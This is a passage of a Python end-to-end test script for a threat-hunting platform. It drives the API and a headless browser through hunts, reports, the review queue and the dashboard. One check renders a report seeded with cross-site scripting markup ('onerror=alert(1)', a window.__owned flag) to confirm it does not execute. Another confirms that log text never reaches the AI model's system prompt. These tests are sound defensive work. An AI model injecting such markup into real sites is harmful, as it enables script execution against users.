    with zipfile.ZipFile(edr, "w") as archive:
        archive.writestr("edr-export.json", telemetry)
    started = api.start_hunt(workspace, edr, "math-full-spectrum", "EDR export")
    if report.check("an EDR export is accepted", started["status_code"] == 201):
        hunt = api.wait_for_hunt(workspace, started["body"]["id"], wait_for_ai=False)
        edr_hunt = hunt["id"]
        observations = api.observations(workspace, hunt["id"])
        report.check("an EDR export reaches the Windows detections",
                     any(item["origin"] == "rule" for item in observations),
                     f"{len(observations)} observations")
    return {"xss_payload": payload, "xss_hunt": hostile_hunt or edr_hunt}


def journey_browser(report: Report, base: str, workspace: dict, hunt_id: str,
                    hostile: dict, out_dir: Path) -> None:
    report.start("13. The interface in a real browser")
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        report.skip("every page renders without a console error", "Playwright is not installed")
        return

    executable = None
    for candidate in sorted(Path("/opt/pw-browsers").glob("chromium-*/chrome-linux/chrome")):
        executable = str(candidate)
    errors: list[str] = []

    with sync_playwright() as playwright:
        try:
            browser = playwright.chromium.launch(executable_path=executable)
        except Exception as error:  # noqa: BLE001
            report.skip("every page renders without a console error", f"no browser: {error}")
            return
        page = browser.new_page(viewport={"width": 1440, "height": 1200})
        page.on("console", lambda message: errors.append(message.text)
                if message.type == "error" else None)
        page.on("pageerror", lambda error: errors.append(str(error)))

        page.goto(base)
        page.fill("input[name=tenant_slug]", workspace["slug"])
        page.fill("input[type=email]", f"admin@{workspace['slug']}.test")
        page.fill("input[type=password]", PASSWORD)
        page.click("button[type=submit]")
        report.check("signing in reaches the workspace",
                     bool(page.wait_for_selector(".topbar", timeout=20000)))

        pages = {
            "dashboard": ".card",
            "hypotheses": ".hyp-card",
            "hunt/new": ".steps",
            "hunts": ".card",
            "rules": ".card",
            "review": ".collector-panel",
            "admin": ".card",
        }
        for route, selector in pages.items():
            page.goto(f"{base}/#/{route}")
            try:
                page.wait_for_selector(selector, timeout=20000)
                rendered = True
            except Exception:  # noqa: BLE001
                rendered = False
            report.check(f"the {route} page renders", rendered)

        page.goto(f"{base}/#/report/{hunt_id}")
        page.wait_for_selector(".obs", timeout=25000)
        body = page.inner_text("body")
        report.check("the report page renders its observations", ".obs" and len(body) > 500)
        report.check("the report states the model assessment", "Model assessment" in body)
        report.check("the origin filter is offered", page.locator("select").count() >= 2)
        report.check("the reviewed and dismissed group is present",
                     page.locator(".dismissed-group").count() > 0)
        page.locator(".obs").first.click()
        page.wait_for_timeout(400)
        page.screenshot(path=str(out_dir / "end-to-end-report.png"))

        page.goto(f"{base}/#/review")
        page.wait_for_selector(".queue-card", timeout=20000)
        report.check("the review queue renders its candidates",
                     page.locator(".queue-card").count() >= 1)
        page.screenshot(path=str(out_dir / "end-to-end-review.png"))

        if hostile.get("xss_hunt"):
            page.goto(f"{base}/#/report/{hostile['xss_hunt']}")
            try:
                page.wait_for_selector(".obs", timeout=25000)
                page.locator("button:has-text('Expand all')").first.click()
                page.wait_for_timeout(1200)
                showing = True
            except Exception:  # noqa: BLE001
                showing = False
            report.check("the hostile report page shows an observation", showing)
            owned = page.evaluate("() => Boolean(window.__owned)")
            injected = page.evaluate("() => document.querySelectorAll('img[onerror]').length")
            report.check("markup in a log line does not execute", owned is False)
            report.check("markup in a log line creates no element", injected == 0)
            shown = page.inner_text("body")
            report.check("markup in a log line is shown as text",
                         not showing or "onerror=alert(1)" in shown)

        page.goto(f"{base}/#/dashboard")
        page.wait_for_selector(".card", timeout=20000)
        page.screenshot(path=str(out_dir / "end-to-end-dashboard.png"))
        browser.close()

    report.check("no page raised a console error", not errors, "; ".join(errors[:3]))


# ---------------------------------------------------------------------------
# driving it
# ---------------------------------------------------------------------------


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--keep", action="store_true", help="keep the working directory")
    parser.add_argument("--out", type=Path, default=None, help="where to put artefacts")
    args = parser.parse_args(argv)

    workdir = Path(tempfile.mkdtemp(prefix="thf-e2e-"))
    out_dir = args.out or workdir
    out_dir.mkdir(parents=True, exist_ok=True)
    report = Report()

    app_port, feed_port, model_port = free_port(), free_port(), free_port()
    base = f"http://127.0.0.1:{app_port}"
    feed_url = f"http://127.0.0.1:{feed_port}/feed"

    publication = make_publication(feed_port)
    model_server = make_model_server(model_port)
    for server in (publication, model_server):
        threading.Thread(target=server.serve_forever, daemon=True).start()

    environment = dict(
        os.environ,
        THF_DATA_DIR=str(workdir / "data"),
        THF_DATABASE_URL=f"sqlite:///{workdir / 'data' / 'thf.db'}",
        THF_JWT_SECRET="e2e-secret-value-that-is-long-enough-0123456789abcdef",
        THF_SEED_DEMO="0",
        THF_AI_ENABLED="1",
        THF_OLLAMA_URL=f"http://127.0.0.1:{model_port}",
        THF_CTI_ENABLED="1",
        THF_CTI_SEED_SOURCES="0",
    )
    (workdir / "data").mkdir(parents=True, exist_ok=True)

    print(f"working directory: {workdir}")
    print(f"application on {base}, publication on port {feed_port}, model on port {model_port}")

    application = subprocess.Popen(
        [sys.executable, "-m", "uvicorn", "app.main:app", "--port", str(app_port)],
        cwd=str(ROOT), env=environment,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    api = None
    try:
        if not wait_for_server(base):
            print("the application never answered")
            return 1

        # The collector reads a publication on the loopback rather than the internet.
        sys.path.insert(0, str(ROOT))
        os.environ.update({k: v for k, v in environment.items() if k.startswith("THF_")})
        from app.database import SessionLocal
        from app.models import FeedSource

        session = SessionLocal()
        session.add(FeedSource(slug="local", name="Example Security Blog", url=feed_url,
                               kind="rss", category="vendor"))
        session.commit()
        session.close()

        from tools.generate_sample_evidence import build

        archive = build(workdir / "evidence.zip", seed=11)

        api = Platform(base)
        journey_startup(report, api)
        people = journey_access(report, api)
        journey_catalogue(report, api, people["first"])
        state = journey_hunt(report, api, people, archive)
        journey_reporting(report, api, state, out_dir)
        journey_isolation(report, api, people, state)
        journey_model_layer(report, api, people["first"])
        journey_analyst(report, api, state)
        collected = journey_collector(report, api, people["first"], feed_url)
        published = journey_review(report, api, people["first"], collected)
        journey_generated_hunt(report, api, people, archive, published)
        hostile = journey_security(report, api, people, workdir) or {}
        journey_browser(report, base, people["first"], state["hunt"]["id"], hostile, out_dir)

        report.start("14. The whole run")
        report.check("the local model was actually called",
                     MODEL_STATE["chat_calls"] > 0, f"{MODEL_STATE['chat_calls']} calls")
        report.check("no log or article text reached a system prompt", all(
            "<<<" not in messages[0]["content"] for messages in MODEL_STATE["prompts"]
        ))
        print(f"\nartefacts in {out_dir}")
    finally:
        if api is not None:
            api.close()
        application.terminate()
        try:
            application.wait(timeout=15)
        except Exception:  # noqa: BLE001
            application.kill()
        for server in (publication, model_server):
            server.shutdown()

    outcome = report.summary()
    if not args.keep and outcome == 0 and args.out is None:
        import shutil

        shutil.rmtree(workdir, ignore_errors=True)
    return outcome


if __name__ == "__main__":
    sys.exit(main())
